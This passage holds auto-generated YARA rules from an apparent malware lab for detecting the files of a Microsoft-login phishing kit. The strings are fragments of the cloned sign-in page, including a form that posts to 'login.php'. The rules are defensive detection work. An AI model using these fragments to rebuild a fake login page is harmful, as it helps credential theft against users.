      $s3 = "2OUQ1NEZFODhFQjY5MCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpCQUVGMjQ0M0NFQTAxMUUwODVFRkVGMkEyMDYzQjNCOSIgeG1wTU06SW5zdGFuY2VJRD0ieG1" ascii /* base64 encoded string '9D54FE88EB690" xmpMM:DocumentID="xmp.did:BAEF2443CEA011E085EFEF2A2063B3B9" xmpMM:InstanceID="xm' */ /* score: '24.00'*/
      $s4 = "Logo::before{content:\"\\ed71 \"}.o365cs-base .ms-Icon--ParatureLogo::before{content:\"\\ed7b \"}.o365cs-base .ms-Icon--SocialLi" ascii /* score: '23.00'*/
      $s5 = "content:\"\\ea51 \"}.o365cs-base .ms-Icon--Lightbulb::before{content:\"\\ea80 \"}.o365cs-base .ms-Icon--BingLogo::before{content" ascii /* score: '23.00'*/
      $s6 = "ase .ms-Icon--TeamsLogo::before{content:\"\\f27b \"}.o365cs-base .ms-Icon--SharepointLogo::before{content:\"\\f27e \"}.o365cs-ba" ascii /* score: '23.00'*/
      $s7 = "3RkNFRCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpFMzVEMjUyMUNFQTAxMUUwQTc0NzgzNTNCNkQ3RkNFRCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3N" ascii /* base64 encoded string 'FCED" xmpMM:InstanceID="xmp.iid:E35D2521CEA011E0A7478353B6D7FCED" xmp:CreatorTool="Adobe Photos' */ /* score: '21.00'*/
      $s8 = "jIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowRUZGQzk4NEE1Q0FFMDExOUI" ascii /* base64 encoded string '" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:OriginalDocumentID="xmp.did:0EFFC984A5CAE0119B' */ /* score: '21.00'*/
      $s9 = "tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0" ascii /* base64 encoded string '/xap/1.0/sType/ResourceRef#" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:OriginalDocumentID=' */ /* score: '21.00'*/
      $s10 = "re{content:\"\\e787 \"}.o365cs-base .ms-Icon--News::before{content:\"\\e900 \"}.o365cs-base .ms-Icon--Download::before{content:" ascii /* score: '21.00'*/
      $s11 = "ieG1wLmRpZDowRUZGQzk4NEE1Q0FFMDExOUI2OUQ1NEZFODhFQjY5MCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpFMzVEMjUyMkNFQTAxMUUwQTc0NzgzNTNCNkQ" ascii /* base64 encoded string 'xmp.did:0EFFC984A5CAE0119B69D54FE88EB690" xmpMM:DocumentID="xmp.did:E35D2522CEA011E0A7478353B6D' */ /* score: '21.00'*/
      $s12 = "wRUZGQzk4NEE1Q0FFMDExOUI2OUQ1NEZFODhFQjY5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI" ascii /* base64 encoded string 'EFFC984A5CAE0119B69D54FE88EB690"/> </rdf:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end="r"' */ /* score: '21.00'*/
      $s13 = "gc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowRUZGQzk4NEE1Q0FFMDExOUI2OUQ1NEZFODhFQjY5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g" ascii /* base64 encoded string 'stRef:documentID="xmp.did:0EFFC984A5CAE0119B69D54FE88EB690"/> </rdf:Description> </rdf:RDF> </x' */ /* score: '21.00'*/
      $s14 = "yaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENDZGQ0I5RkQzQ0RFMDExQTgyMjkyMjdERUQwRkIxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo" ascii /* base64 encoded string 'ivedFrom stRef:instanceID="xmp.iid:D46FCB9FD3CDE011A8229227DED0FB1E" stRef:documentID="xmp.did:' */ /* score: '21.00'*/
      $s15 = "geG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1" ascii /* base64 encoded string 'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xm' */ /* score: '21.00'*/
      $s16 = "wdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29" ascii /* base64 encoded string 'tion rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.co' */ /* score: '21.00'*/
      $s17 = "wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWY" ascii /* base64 encoded string 'MM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef' */ /* score: '21.00'*/
      $s18 = "kIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0" ascii /* base64 encoded string '"?> <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-' */ /* score: '21.00'*/
      $s19 = "ob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENDZGQ0I5RkQzQ0RFMDExQTgyMjkyMjdERUQwRkIxRSI" ascii /* base64 encoded string 'op CS5 Windows"> <xmpMM:DerivedFrom stRef:instanceID="xmp.iid:D46FCB9FD3CDE011A8229227DED0FB1E"' */ /* score: '21.00'*/
      $s20 = "tant}.o365cs-nav-header16.o365cs-newDefaultTheme-on .o365cs-nav-bposLogo .o365cs-nav-brandingText{color:#d83b01;font-family:\"Se" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x662e and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule ConvergedLogin_PCore {
   meta:
      description = "phish__microsoft - file ConvergedLogin_PCore.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "db255a3725ebe9511b9f4bc95d906b8ea2d1bc8d37ed799efa8cadb5ca6b6206"
   strings:
      $x1 = "},function(e,t,n){function i(e){var t=this,n=null,i=e.serverData,a=e.idpRedirectUrl,r=e.idpRedirectPostParams,o=e.idpRedirectPro" ascii /* score: '88.00'*/
      $x2 = "SampleRate:this.sample.sampleRate},!0);return e},n.prototype._applyApplicationContext=function(e,t){if(t){var n=new a.ContextTag" ascii /* score: '82.00'*/
      $x3 = "p.gc=function(e){return(e=p.Oa(e))?e.$data:o},p.b(\"bindingHandlers\",p.d),p.b(\"applyBindings\",p.ub),p.b(\"applyBindingsToDesc" ascii /* score: '80.00'*/
      $x4 = "OneTimeCode:3,RemoteNGC:4,PhoneDisambiguation:5,LwaConsent:6,IdpDisambiguation:7,IdpRedirect:8,ViewAgreement:10,LearnMore:11,Til" ascii /* score: '74.00'*/
      $x5 = "a.getRSBlocks=function(e,t){var n=a.getRsBlockTable(e,t);if(void 0==n)throw new Error(\"bad rs block @ typeNumber:\"+e+\"/errorC" ascii /* score: '73.00'*/
      $x6 = "},function(e,t,n){e.exports=n.p+\"images/AppCentipede/AppCentipede_Microsoft.svg?x=aed5eb9ccea43f119a25b3b74c59c7e7\"},function(" ascii /* score: '72.00'*/
      $x7 = "},function(e,t,n){function i(e){function t(){var e;if(!d())return e=h||null,h=null,e;var t=o.codeTextbox.value();return t?l()?l(" ascii /* score: '71.00'*/
      $x8 = "viewId:e,viewParams:t}}function H(e,t){return{action:x.ShowError,error:e,isBlockingError:t}}function j(e,t,n){return{action:x.Re" ascii /* score: '70.00'*/
      $x9 = "document.location.replace(J)},null,s.DefaultRequestTimeout)},N.bannerClose_onClick=function(){R()},N.learnMore_onShow=function()" ascii /* score: '70.00'*/
      $x10 = "!function(){!function(o){var s=this||(0,eval)(\"this\"),l=s.document,c=s.navigator,d=s.jQuery,u=s.JSON;!function(o){a=[t,n],i=o," ascii /* score: '66.00'*/
      $x11 = "var t;!function(e){e[e.Verbose=0]=\"Verbose\",e[e.Information=1]=\"Information\",e[e.Warning=2]=\"Warning\",e[e.Error=3]=\"Error" ascii /* score: '65.00'*/
      $x12 = "},n}();e.ajaxRecord=n}(t=e.ApplicationInsights||(e.ApplicationInsights={}))}(n||(n={}));var n;!function(e){var t;!function(t){va" ascii /* score: '61.00'*/
      $x13 = "},function(e,t,n){function i(e){var t=this,n=e.collapseExcessLinks;t.onMenuOpen=o.create(),t.actionLinks=a.observableArray([]),t" ascii /* score: '59.00'*/
      $x14 = "!function(e){function t(n){if(i[n])return i[n].exports;var a=i[n]={exports:{},id:n,loaded:!1};return e[n].call(a.exports,a,a.exp" ascii /* score: '52.00'*/
      $x15 = "<!-- /ko --> <input type=hidden name=ps data-bind=\"value: postedLoginStateViewId\"/> <input type=hidden name=psRNGCDefaultType " ascii /* score: '36.00'*/
      $x16 = "(l.ServerData.A),enableExtensions:!0}),e.exports=i},function(e,t,n){e.exports=\"<!-- \"+(n(207),\"\")+' --> <div id=loginHeader " ascii /* score: '36.00'*/
      $x17 = "svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><!-- /k" ascii /* score: '35.00'*/
      $x18 = "function(e,t,n){e.exports=\"<!-- \"+(n(207),\"\")+' --> <div id=loginHeader class=\"row text-title\" role=heading data-bind=\"te" ascii /* score: '35.00'*/
      $x19 = "unction(e,t,n){e.exports=\"<!-- \"+(n(207),\"\")+' --> <div class=\"row text-body text-block-body\"> <div id=loginDescription da" ascii /* score: '33.00'*/
      $x20 = "v><!-- /ko --><!-- ko if: svr.AG --> <div id=idPartnerPL data-bind=\"injectIframe: { url: svr.AG }\"></div> <!-- /ko -->'},funct" ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 1000KB and
      1 of ($x*)
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_index_files_prefetch_data_sprite1 {
   meta:
      description = "phish__microsoft - file sprite1.css"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "461f87e55bba34c4d9248d1b45685ea832eba56c15ebf6cccf75d49f1547b502"
   strings:
      $s1 = ".image-adchoices_icon-png{background:url('adchoices_icon.png');width:12px;height:12px}.image-olk_logo_white_cropped-png{backgrou" ascii /* score: '18.00'*/
      $s2 = "height:32px;background:url('sprite1.mouse.png') -217px -0}.image-office_logo_white_small-png{width:81px;height:26px;background:u" ascii /* score: '16.00'*/
      $s3 = ".mouse.png') -444px -0}.image-twitrerror2-png{width:18px;height:18px;background:url('sprite1.mouse.png') -464px -0}.image-yhooer" ascii /* score: '14.00'*/
      $s4 = "prite1.mouse.png') -354px -22px}.image-dc-generic-png{width:16px;height:16px;background:url('sprite1.mouse.png') -372px -22px}.i" ascii /* score: '14.00'*/
      $s5 = "4px -0}.image-googerror2-png{width:18px;height:18px;background:url('sprite1.mouse.png') -404px -0}.image-lierror2-png{width:18px" ascii /* score: '14.00'*/
      $s6 = ";height:18px;background:url('sprite1.mouse.png') -424px -0}.image-sinweerror2-png{width:18px;height:18px;background:url('sprite1" ascii /* score: '14.00'*/
      $s7 = "prite1.mouse.png') -145px -0}.image-listview_buscheck_top-png{width:16px;height:32px;background:url('sprite1.mouse.png') -163px " ascii /* score: '14.00'*/
      $s8 = "sprite1.mouse.png') -336px -40px}.image-dc-vsd-png{width:16px;height:16px;background:url('sprite1.mouse.png') -354px -40px}.imag" ascii /* score: '14.00'*/
      $s9 = "background:url('sprite1.mouse.png') -362px -0}.image-fberror4-png{width:18px;height:18px;background:url('sprite1.mouse.png') -38" ascii /* score: '14.00'*/
      $s10 = "nd:url('olk_logo_white_cropped.png');width:265px;height:310px}.image-owa_brand-png{background:url('owa_brand.png');width:160px;h" ascii /* score: '12.00'*/
      $s11 = ".image-adchoices_icon-png{background:url('adchoices_icon.png');width:12px;height:12px}.image-olk_logo_white_cropped-png{backgrou" ascii /* score: '12.00'*/
      $s12 = "22px -0}.image-close_p-png{width:16px;height:16px;background:url('sprite1.mouse.png') -540px -0}.image-dc-accdb-png{width:16px;h" ascii /* score: '11.00'*/
      $s13 = "-0}.image-listview_busstop_bottom-png{width:16px;height:32px;background:url('sprite1.mouse.png') -181px -0}.image-listview_busst" ascii /* score: '11.00'*/
      $s14 = "ng') -552px -40px}.image-response_approve-png{width:16px;height:16px;background:url('sprite1.mouse.png') -570px -40px}.image-res" ascii /* score: '11.00'*/
      $s15 = "te_all-png{width:32px;height:32px;background:url('sprite1.mouse.png') -77px -0}.image-clutter_delete_all_p-png{width:32px;height" ascii /* score: '11.00'*/
      $s16 = "op_empty-png{width:16px;height:32px;background:url('sprite1.mouse.png') -199px -0}.image-listview_busstop_middle-png{width:16px;" ascii /* score: '11.00'*/
      $s17 = "url('sprite1.mouse.png') -480px -22px}.image-dc-one-png{width:16px;height:16px;background:url('sprite1.mouse.png') -498px -22px}" ascii /* score: '11.00'*/
      $s18 = "') -552px -22px}.image-dc-pptx-png{width:16px;height:16px;background:url('sprite1.mouse.png') -570px -22px}.image-dc-rpmsg-png{w" ascii /* score: '11.00'*/
      $s19 = "f');width:32px;height:32px}.image-r_jpg-png{width:75px;height:75px;background:url('sprite1.mouse.png') -0 -0}.image-clutter_dele" ascii /* score: '11.00'*/
      $s20 = "eight:16px;background:url('sprite1.mouse.png') -558px -0}.image-dc-aspx-png{width:16px;height:16px;background:url('sprite1.mouse" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x692e and filesize < 20KB and
      8 of them
}

rule prefetch {
   meta:
      description = "phish__microsoft - file prefetch.html"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0f2176dcd91136cd67d92842d2d3db73bf8380e4eaeaae74c5709f18983297be"
   strings:
      $s1 = "em/16.2389.15.2575947/scripts/boot.worldwide.2.mouse.js','https://r4.res.office365.com/owa/prem/16.2389.15.2575947/scripts/boot." ascii /* score: '23.00'*/
      $s2 = "https://r4.res.office365.com/owa/prem/16.2389.15.2575947/scripts/boot.worldwide.1.mouse.js','https://r4.res.office365.com/owa/pr" ascii /* score: '23.00'*/
      $s3 = "        var pf = (function(){function h(n){for(var r=n+\"=\",u=document.cookie.split(\";\"),t,i=0;i<u.length;++i){for(t=u[i];t.c" ascii /* score: '21.00'*/
      $s4 = "icons.woff') format('woff'),url('https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/styles/fonts/office365icons." ascii /* score: '20.00'*/
      $s5 = "            pf.prefetch(\"OWAPF\", ['https://r4.res.office365.com/owa/prem/16.2389.15.2575947/scripts/boot.worldwide.0.mouse.js'" ascii /* score: '18.00'*/
      $s6 = "            pf.prefetch(\"OWAPF\", ['https://r4.res.office365.com/owa/prem/16.2389.15.2575947/scripts/boot.worldwide.0.mouse.js'" ascii /* score: '18.00'*/
      $s7 = "ttf') format('truetype'),url('https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/styles/fonts/office365icons.svg" ascii /* score: '17.00'*/
      $s8 = "worldwide.3.mouse.js','https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/images/0/sprite1.mouse.png','https://r" ascii /* score: '17.00'*/
      $s9 = "4.res.office365.com/owa/prem/16.2389.15.2575947/resources/images/0/sprite1.mouse.css','https://r4.res.office365.com/owa/prem/16." ascii /* score: '17.00'*/
      $s10 = "fix') format('embedded-opentype'),url('https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/styles/fonts/office365" ascii /* score: '17.00'*/
      $s11 = "nt.cookie=n+\"=\"+t+\"; path=/\"}function l(n){for(var r={p:\"\"},u=n.split(\"&\"),i,t=0;t<u.length;t++)i=u[t].split(\":\"),r[i[" ascii /* score: '13.00'*/
      $s12 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">" fullword ascii /* score: '12.00'*/
      $s13 = "                src: url('https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/styles/fonts/office365icons.eot?#ie" ascii /* score: '12.00'*/
      $s14 = "                src: url('https://r4.res.office365.com/owa/prem/16.2389.15.2575947/resources/styles/fonts/office365icons.eot?#ie" ascii /* score: '12.00'*/
      $s15 = "<link href=\"prefetch_data/boot_003.js\" rel=\"stylesheet\"><link href=\"prefetch_data/boot.js\" rel=\"stylesheet\"><link href=" ascii /* score: '12.00'*/
      $s16 = "};r.onerror=function(){f(!1);e(n+1,i)};document.head.appendChild(r)}else i()}function v(f,o,c){r=f;u=h(r);t=o;i=c;u&&(n=l(u));wi" ascii /* score: '12.00'*/
      $s17 = "    <meta http-equiv=\"x-ua-compatible\" content=\"IE=Edge\">" fullword ascii /* score: '10.00'*/
      $s18 = "2389.15.2575947/resources/styles/0/boot.worldwide.mouse.css'], ['office365icons']);" fullword ascii /* score: '7.00'*/
      $s19 = "ndow.onload=function(){e(0,function(){s(0)})}}var r,u,t,i,n,o;return String.prototype.endsWith=function(n){return this.match(n+" ascii /* score: '7.00'*/
      $s20 = "g\" rel=\"stylesheet\"><link href=\"prefetch_data/sprite1.css\" rel=\"stylesheet\"><link href=\"prefetch_data/boot.css\" rel=\"s" ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 9KB and
      8 of them
}

rule _opt_mal_phish__microsoft_home_ubuntu_malware_lab_samples_extracted_phishing_Microsoft_login {
   meta:
      description = "phish__microsoft - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c82df60eb64c4d38cf46c17affdc314f64a4f5da416ac98825cd95abbc0c2bc1"
   strings:
      $x1 = "<html dir=\"ltr\" lang=\"EN-US\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=" ascii /* score: '66.00'*/
      $x2 = "ncipe~239!!!SA~Saudi Arabia~966!!!SN~Senegal~221!!!RS~Serbia~381!!!SC~Seychelles~248!!!SL~Sierra Leone~232!!!SG~Singapore~65!!!X" ascii /* score: '66.00'*/
      $x3 = "2018 Microsoft</span><!-- /ko --> <a id=\"ftrTerms\" data-bind=\"text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, " ascii /* score: '61.00'*/
      $x4 = "                updateFocus: usernameTextbox.textbox_onUpdateFocus } }\"><!-- ko withProperties: { '$placeholderText': placehold" ascii /* score: '42.00'*/
      $x5 = "                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }\"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- k" ascii /* score: '42.00'*/
      $x6 = "essumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href=\"https://login.live.com/pp1600/#\" role=\"button\" " ascii /* score: '41.00'*/
      $x7 = "patible\" content=\"IE=Edge\"><!--<base href=\"https://login.live.com/pp1600/\">--><!--<base href=\".\">--><base href=\".\"><scr" ascii /* score: '41.00'*/
      $x8 = "<div class=\"row\"> <div class=\"col-md-24\"> <div class=\"text-13 action-links\"> <div class=\"form-group\"> <a id=\"idA_PWD_Fo" ascii /* score: '39.00'*/
      $x9 = "            visible: isPrimaryButtonVisible\" value=\"Sign in\"> </div> </div></div> </div></div><!-- ko if: $usernameView.altCr" ascii /* score: '38.00'*/
      $x10 = "!-- ko if: newSessionMessage --><!-- /ko --> <input type=\"hidden\" name=\"ps\" data-bind=\"value: postedLoginStateViewId\" valu" ascii /* score: '36.00'*/
      $x11 = "rText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type=\"email\" name=\"loginfmt\" id=" ascii /* score: '35.00'*/
      $x12 = "                            showLearnMore: $loginPage.learnMore_onShow } }\"><!--  --> <div data-bind=\"component: { name: &#39;" ascii /* score: '33.00'*/
      $x13 = ">\",al:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600',am:'',ap:,ar:2,urlPost:'login.php',bR:'',at:tr" ascii /* score: '33.00'*/
      $x14 = "J:'',aK:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600',aM:'https://login.live.com/GetCredentialTyp" ascii /* score: '33.00'*/
      $x15 = "Color) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class=\"logo\" role=" ascii /* score: '33.00'*/
      $x16 = "f=\"https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600\">Privacy &amp; cookies</a><!-- ko if: im" ascii /* score: '32.00'*/
      $x17 = "od=\"post\" target=\"_top\" autocomplete=\"off\" data-bind=\"autoSubmit: forceSubmit, attr: { action: postUrl }\" action=\"login" ascii /* score: '31.00'*/
      $x18 = "/ConvergedLogin_PCore.js\",1,\"https://msagfx.live.com/16.000.27773.2/ConvergedLogin_PCore.js\",null);</script><script type=\"te" ascii /* score: '31.00'*/
      $x19 = "tR',ag:'',bG:\"&copy;2018 Microsoft\",sPOST_NewUser:'',bH:'',aj:'https://account.live.com/query.aspx?uaid=d9c1b58bf69145d98c0ddd" ascii /* score: '31.00'*/
      $x20 = "ko template: { nodes: [$data], data: $parent } --><div data-viewid=\"1\" data-bind=\"pageViewComponent: { name: &#39;login-pagin" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*)
}

rule ConvergedLoginPaginatedStrings {
   meta:
      description = "phish__microsoft - file ConvergedLoginPaginatedStrings.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "968b0918d74c4108d1695cb6d4075cb5bdadad0fd97ff5e9f9540fc6292f191e"
   strings:
      $x1 = "!function(e){function o(i){if(t[i])return t[i].exports;var n=t[i]={exports:{},id:i,loaded:!1};return e[i].call(n.exports,n,n.exp" ascii /* score: '61.00'*/
      $x2 = "By continuing to browse this site, you agree to this use. <a href=\"#\" id=\"msccLearnMore\">Learn more</a>',1===o.B2?(e.CT_PWD_" ascii /* score: '52.00'*/
      $s3 = "inedSigninSignupDefaultTitle:3,RemoteConnectLogin:4,CombinedSigninSignupV2:5,CombinedSigninSignupV2WelcomeTitle:6},o.AllowedIden" ascii /* score: '26.00'*/
      $s4 = "d={DomainToken:\"#~#partnerdomain#~#\",FedDomain:\"#~#FederatedDomainName_LS#~#\",Partner:\"#~#FederatedPartnerName_LS#~#\"},o.L" ascii /* score: '25.00'*/
      $s5 = "\"#\" id=\"learnMoreLink\" target=\"_top\">What\\'s this?</a>';break;case _.RemoteConnectLogin:e.WF_STR_Default_Desc='Use your M" ascii /* score: '24.00'*/
      $s6 = "A Microsoft account is what you use to sign in to Microsoft services such as Outlook.com, Skype, OneDrive, Office, Xbox, Windows" ascii /* score: '20.00'*/
      $s7 = "t account to sign in to {0}. <a href=\"#\" id=\"learnMoreLink\" target=\"_top\">What\\'s this?</a>';break;case _.CombinedSigninS" ascii /* score: '20.00'*/
      $s8 = "Error_WrongCreds=o.c?\"The password is incorrect. Please try again.\":'Your account or password is incorrect. If you don\\'t rem" ascii /* score: '20.00'*/
      $s9 = "CT_PWD_STR_Error_WrongCreds=o.c?\"The password is incorrect. Please try again.\":'Your account or password is incorrect. If you " ascii /* score: '20.00'*/
      $s10 = "can contain numbers, spaces, and these special characters: ( ) [ ] . - # * /\",e.CT_PWD_STR_Error_MissingPassword=\"Please enter" ascii /* score: '19.00'*/
      $s11 = "guments.length;o++)e=e.replace(new RegExp(\"\\\\{\"+(o-1)+\"\\\\}\",\"g\"),arguments[o]);return e}}}]),window.__ConvergedLoginPa" ascii /* score: '18.00'*/
      $s12 = ":e.WF_STR_Default_Desc=\"We'll check to see if you already have a Microsoft account.\";break;case _.CombinedSigninSignupV2Welcom" ascii /* score: '18.00'*/
      $s13 = "S#~#</b> is blocked for one of these reasons:\",e.WF_STR_Lockout_Reason1=\"Someone entered the wrong password too many times.\"," ascii /* score: '18.00'*/
      $s14 = "ak;case _.CombinedSigninSignupV2WelcomeTitle:e.WF_STR_HeaderDefault_Title=\"Welcome\";break;default:e.WF_STR_HeaderDefault_Title" ascii /* score: '17.00'*/
      $s15 = "abel=\"Learn more about Microsoft's Cookie Policy\",o.AC){case _.CombinedSigninSignup:e.WF_STR_HeaderDefault_Title=\"Hi there!\"" ascii /* score: '17.00'*/
      $s16 = "edDomainName_LS#~# account may not be enabled to use this service or there may be a system error at #~#FederatedPartnerName_LS#~" ascii /* score: '16.00'*/
      $s17 = "ar i=window;i.StringRepository=e.exports=i.StringRepository||new t},function(e,o){o.Tokens={Username:\"#~#MemberName_LS#~#\"},o." ascii /* score: '16.00'*/
      $s18 = "er your password, <a id=\"idA_IL_ForgotPassword0\" href=\"\">reset it now.</a>',e.CT_IHL_STR_Error_WrongHip='Enter your password" ascii /* score: '15.00'*/
      $s19 = "mail address, phone number, or Skype name.\",e.CT_PWD_STR_Error_GetCredentialTypeError=\"There was an issue looking up your acco" ascii /* score: '15.00'*/
      $s20 = "STR_Error_OldSkypePwd=\"Your old Skype password doesn't work anymore. Try the password for your Microsoft account.\",e.CT_PWD_ST" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule ConvergedLoginPaginatedStrings_EN {
   meta:
      description = "phish__microsoft - file ConvergedLoginPaginatedStrings.EN.js"
      author = "Comps Team Malware Lab"
      reference = "phish__microsoft phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "9ed7ca26da41a6314db0efd4c26badf3346991b6b7cdf9eec315fa6730ee688a"
   strings:
      $x1 = "!function(e){function o(i){if(t[i])return t[i].exports;var n=t[i]={exports:{},id:i,loaded:!1};return e[i].call(n.exports,n,n.exp" ascii /* score: '61.00'*/
      $x2 = "By continuing to browse this site, you agree to this use. <a href=\"#\" id=\"msccLearnMore\">Learn more</a>',1===o.Bw?(e.CT_PWD_" ascii /* score: '52.00'*/
      $s3 = "inedSigninSignupDefaultTitle:3,RemoteConnectLogin:4,CombinedSigninSignupV2:5,CombinedSigninSignupV2WelcomeTitle:6},o.AllowedIden" ascii /* score: '26.00'*/
      $s4 = "d={DomainToken:\"#~#partnerdomain#~#\",FedDomain:\"#~#FederatedDomainName_LS#~#\",Partner:\"#~#FederatedPartnerName_LS#~#\"},o.L" ascii /* score: '25.00'*/
      $s5 = "\"#\" id=\"learnMoreLink\" target=\"_top\">What\\'s this?</a>';break;case _.RemoteConnectLogin:e.WF_STR_Default_Desc='Use your M" ascii /* score: '24.00'*/
      $s6 = "A Microsoft account is what you use to sign in to Microsoft services such as Outlook.com, Skype, OneDrive, Office, Xbox, Windows" ascii /* score: '20.00'*/
      $s7 = "t account to sign in to {0}. <a href=\"#\" id=\"learnMoreLink\" target=\"_top\">What\\'s this?</a>';break;case _.CombinedSigninS" ascii /* score: '20.00'*/
      $s8 = "CT_PWD_STR_Error_WrongCreds=o.b?\"The password is incorrect. Please try again.\":'Your account or password is incorrect. If you " ascii /* score: '20.00'*/
      $s9 = "Error_WrongCreds=o.b?\"The password is incorrect. Please try again.\":'Your account or password is incorrect. If you don\\'t rem" ascii /* score: '20.00'*/
      $s10 = "can contain numbers, spaces, and these special characters: ( ) [ ] . - # * /\",e.CT_PWD_STR_Error_MissingPassword=\"Please enter" ascii /* score: '19.00'*/
      $s11 = "guments.length;o++)e=e.replace(new RegExp(\"\\\\{\"+(o-1)+\"\\\\}\",\"g\"),arguments[o]);return e}}}]),window.__ConvergedLoginPa" ascii /* score: '18.00'*/
      $s12 = ":e.WF_STR_Default_Desc=\"We'll check to see if you already have a Microsoft account.\";break;case _.CombinedSigninSignupV2Welcom" ascii /* score: '18.00'*/
      $s13 = "S#~#</b> is blocked for one of these reasons:\",e.WF_STR_Lockout_Reason1=\"Someone entered the wrong password too many times.\"," ascii /* score: '18.00'*/
      $s14 = "ak;case _.CombinedSigninSignupV2WelcomeTitle:e.WF_STR_HeaderDefault_Title=\"Welcome\";break;default:e.WF_STR_HeaderDefault_Title" ascii /* score: '17.00'*/
      $s15 = "abel=\"Learn more about Microsoft's Cookie Policy\",o.Ac){case _.CombinedSigninSignup:e.WF_STR_HeaderDefault_Title=\"Hi there!\"" ascii /* score: '17.00'*/
      $s16 = "edDomainName_LS#~# account may not be enabled to use this service or there may be a system error at #~#FederatedPartnerName_LS#~" ascii /* score: '16.00'*/
      $s17 = "ar i=window;i.StringRepository=e.exports=i.StringRepository||new t},function(e,o){o.Tokens={Username:\"#~#MemberName_LS#~#\"},o." ascii /* score: '16.00'*/
